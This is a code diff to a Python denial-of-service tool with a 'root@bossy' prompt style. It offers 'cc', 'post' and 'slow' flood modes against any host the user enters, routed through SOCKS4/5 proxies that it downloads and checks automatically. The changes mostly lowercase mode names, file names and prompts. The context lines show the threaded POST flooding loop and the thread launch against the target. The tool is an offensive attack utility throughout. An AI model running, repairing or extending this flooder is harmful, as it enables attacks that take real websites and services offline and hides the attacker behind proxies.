@@ -167,7 +167,7 @@ def post(socks_type):
 			if str(port) == '443': # //AUTO Enable SSL MODE :)
 				s = ssl.wrap_socket(s)
 			s.send(str.encode(request))
-			print ("[*] "+n+" Post Flooding From  | "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] "+n+" Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
 					s.send(str.encode(request))
@@ -258,7 +258,7 @@ def slow(conn,socks_type):
 				sys.stdout.flush()
 				pass
 nums = 0
-def checking(lines,socks_type,ms):#Proxy checker coded root@bossy:~# 
+def checking(lines,socks_type,ms):#Proxy checker root@bossy:~
 	global nums
 	global proxies
 	try:#dirty fix
@@ -289,7 +289,7 @@ def checking(lines,socks_type,ms):#Proxy checker coded root@bossy:~#
 			err +=1
 	nums += 1
 
-def check_socks(ms):#root@bossy:~# 
+def check_socks(ms):#Coded root@bossy:~
 	global nums
 	thread_list=[]
 	for lines in list(proxies):
@@ -308,20 +308,20 @@ def check_socks(ms):#root@bossy:~#
 		sys.stdout.write("root@bossy:~# Checked "+str(nums)+" Proxies\r")
 		sys.stdout.flush()
 	print("\r\nroot@bossy:~# Checked All Proxies Total Worked : "+str(len(proxies)))
-	ans = input("root@bossy:~# Do U Want To Save Them In A File ? ( Y / n Default = Y ) ")
-	if ans == "Y" or ans == "":
+	ans = input("root@bossy:~# Do U Want To Save Them In A File ? ( y / n Default = y) ")
+	if ans == "y" or ans == "":
 		if choice == "4":
-			with open("Socks4.txt", 'wb') as fp:
+			with open("socks4.txt", 'wb') as fp:
 				for lines in list(proxies):
 					fp.write(bytes(lines,encoding='utf8'))
 			fp.close()
-			print("root@bossy:~# They Are Saved In Socks4.txt.")
+			print("root@bossy:~# They Are Saved In socks4.txt.")
 		elif choice == "5":
 			with open("socks5.txt", 'wb') as fp:
 				for lines in list(proxies):
 					fp.write(bytes(lines,encoding='utf8'))
 			fp.close()
-			print("root@bossy:~# They Are Saved In Socks5.txt.")
+			print("root@bossy:~# They Are Saved In socks5.txt.")
 			
 def check_list(socks_file):
 	print("root@bossy:~# Checking List")
@@ -338,7 +338,7 @@ def check_list(socks_file):
 
 def downloadsocks(choice):
 	if choice == "4":
-		f = open("Socks4.txt",'wb')
+		f = open("socks4.txt",'wb')
 		try:
 			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=1000")
 			f.write(r.content)
@@ -366,14 +366,14 @@ def downloadsocks(choice):
 					proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
 				except:
 					pass
-				out_file = open("Socks4.txt","a")
+				out_file = open("socks4.txt","a")
 				out_file.write(proxies)
 				out_file.close()
 		except:
 			pass
-		print("root@bossy:~# Have Already downloaded Socks4 List As Socks4.txt")
+		print("root@bossy:~# Have Already Ddownloaded Socks4 List As socks4.txt")
 	if choice == "5":
-		f = open("Socks5.txt",'wb')
+		f = open("socks5.txt",'wb')
 		try:
 			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
 			f.write(r.content)
@@ -385,7 +385,7 @@ def downloadsocks(choice):
 			f.close()
 		except:
 			f.close()
-		print("root@bossy:~# Have Already Downloaded Socks5 List As Socks5.txt")
+		print("root@bossy:~# Have Already Downloaded Socks5 List As socks5.txt")
 
 def main():
 	global ip
@@ -400,18 +400,18 @@ def main():
 	ip = ""
 	port = ""
 	mode = ""
-	print("root@bossy:~# Mode : [ CC / POST / SLOW / CHECK ]")
+	print("root@bossy:~# Mode : [ cc / post / slow / check ] ")
 	while mode == "" :
-		mode = str(input("root@bossy:~# Choose Your Mode ( Default = CC ) : ")).strip()
+		mode = str(input("root@bossy:~# Choose Your Mode ( Default = cc ) : ")).strip()
 		if mode == "":
-			mode = "CC"
-		elif(mode != "CC") and (mode != "POST")and(mode != "SLOW" )and(mode !="CHECK"):
+			mode = "cc"
+		elif(mode != "cc") and (mode != "post")and(mode != "slow" )and(mode !="check"):
 			print("root@bossy:~# Plese Enter Correct Mode")
 			mode = ""
 			continue
-	ip = str(input("root@bossy:~# Host / IP : "))
+	ip = str(input("root@bossy:~# HOST / IP : "))
 	if ip == "":
-		print("root@bossy:~# Plese Enter Correct Host Or Ip ")
+		print("root@bossy:~# Plese Enter Correct Host Or Ip")
 		sys.exit(1)
 	if mode == "slow" or mode == "check":
 		pass
@@ -430,7 +430,7 @@ def main():
 		if str(port) == '443':
 			print("root@bossy:~# [!] Enable SSL Mode")
 	if mode == "post":
-		mode2 = str(input("root@bossy:~# Customize Post Data ? ( y /  n Default = n ) : ")).strip()
+		mode2 = str(input("root@bossy:~# Customize Post Data ? ( y / n Default = n ) : ")).strip()
 		if mode2 == "y":
 			data = open(input("root@bossy:~# Input The File's Path : ").strip()).readlines()
 			data = ' '.join([str(txt) for txt in data])
@@ -439,7 +439,7 @@ def main():
 		cookies = str(input("root@bossy:~# Plese Input The Cookies : ")).strip()
 	choice = ""
 	while choice == "":
-		choice = str(input("root@bossy:~# Choose Your Socks Mode ( 4 / 5 , Default = 5 ) : ")).strip()
+		choice = str(input("root@bossy:~# Choose Your Socks Mode ( 4 / 5 Default = 5 ) : ")).strip()
 		if choice == "":
 			choice = "5"
 		if choice != "4" and choice != "5":
@@ -450,33 +450,33 @@ def main():
 		else:
 			socks_type = 5
 	if mode == "check":
-		N = str(input("root@bossy:~# Do You Need To Get Socks List ? ( Y / n Default = Y ) : "))
-		if N == 'Y' or N == "" :
+		N = str(input("root@bossy:~# Do You Need To Get Socks List ? ( y / n Default = y ) : "))
+		if N == 'y' or N == "" :
 			downloadsocks(choice)
 		else:
 			pass
 		if choice == "4":
-			out_file = str(input("root@bossy:~# Socks4 Proxy File Path ( Socks4.txt ) : "))
+			out_file = str(input("root@bossy:~# Socks4 Proxy File Path ( socks4.txt ) : "))
 			if out_file == '':
-				out_file = str("Socks4.txt")
+				out_file = str("socks4.txt")
 			else:
 				out_file = str(out_file)
 			check_list(out_file)
 			proxies = open(out_file).readlines()
 		elif choice == "5":
-			out_file = str(input("root@bossy:~# Socks5 Proxy File Path ( Socks5.txt ) : "))
+			out_file = str(input("root@bossy:~# Socks5 Proxy File Path ( socks5.txt ) : "))
 			if out_file == '':
-				out_file = str("Socks5.txt")
+				out_file = str("socks5.txt")
 			else:
 				out_file = str(out_file)
 			check_list(out_file)
 			proxies = open(out_file).readlines()
 		print ("root@bossy:~# Number Of Socks%s Proxies : %s" %(choice,len(proxies)))
 		time.sleep(0.03)
-		ans = str(input("root@bossy:~# Do U Need To Check The Socks List? ( Y / n Defualt = Y ) : "))
+		ans = str(input("root@bossy:~# Do U Need To Check The Socks List ? ( y / n Defualt = y ) : "))
 		if ans == "":
-			ans = "Y"
-		if ans == "Y":
+			ans = "y"
+		if ans == "y":
 			ms = str(input("root@bossy:~# Delay Of Socks ( Seconds Default = 1 ) : "))
 			if ms == "":
 				ms = int(1)
@@ -499,33 +499,33 @@ def main():
 			thread_num = int(thread_num)
 		except:
 			sys.exit("root@bossy:~# Error Thread Number")
-	N = str(input("root@bossy:~# Do You Need To Get Socks List ? ( Y / n Default =  Y ) : "))
-	if N == 'Y' or N == "" :
+	N = str(input("root@bossy:~# Do You Need To Get Socks List ? ( y / n Default = y ) : "))
+	if N == 'y' or N == "" :
 		downloadsocks(choice)
 	else:
 		pass
 	if choice == "4":
-		out_file = str(input("root@bossy:~# Socks4 Proxy File Path ( Socks4.txt ) : "))
+		out_file = str(input("root@bossy:~# Socks4 Proxy File Path ( socks4.txt ) : "))
 		if out_file == '':
-			out_file = str("Socks4.txt")
+			out_file = str("socks4.txt")
 		else:
 			out_file = str(out_file)
 		check_list(out_file)
 		proxies = open(out_file).readlines()
 	elif choice == "5":
-		out_file = str(input("root@bossy:~# Socks5 Proxy File Path ( Socks5.txt ) : "))
+		out_file = str(input("root@bossy:~# Socks5 Proxy File Path ( socks5.txt ) : "))
 		if out_file == '':
-			out_file = str("Socks5.txt")
+			out_file = str("socks5.txt")
 		else:
 			out_file = str(out_file)
 		check_list(out_file)
 		proxies = open(out_file).readlines()
 	print ("root@bossy:~# Number Of Socks%s Proxies : %s" %(choice,len(proxies)))
 	time.sleep(0.03)
-	ans = str(input("root@bossy:~# Do U Need To Check The Socks List ? ( Y / n Defualt = Y ) : "))
+	ans = str(input("root@bossy:~# Do U Need To Check The Socks List ? ( y / n Defualt = y ) : "))
 	if ans == "":
-		ans = "Y"
-	if ans == "Y":
+		ans = "y"
+	if ans == "y":
 		ms = str(input("root@bossy:~# Delay Of Socks ( Seconds Default = 1 ) : "))
 		if ms == "":
 			ms = int(1)
@@ -546,16 +546,16 @@ def main():
 			multiple = int(100)
 		else:
 			multiple = int(multiple)
-		input("root@bossy:~# Press Enter to Continue.")
+		input("root@bossy:~# Press Enter To Continue.")
 		if mode == "post":
 			for _ in range(thread_num):
 				th = threading.Thread(target = post,args=(socks_type,))
 				th.setDaemon(True)
 				th.start()
 				#print("Threads "+str(i+1)+" created")
-		elif mode == "CC":
+		elif mode == "cc":
 			for _ in range(thread_num):
-				th = threading.Thread(target = CC,args=(socks_type,))
+				th = threading.Thread(target = cc,args=(socks_type,))
 				th.setDaemon(True)
 				th.start()
 					#print("Threads "+str(i+1)+" created")
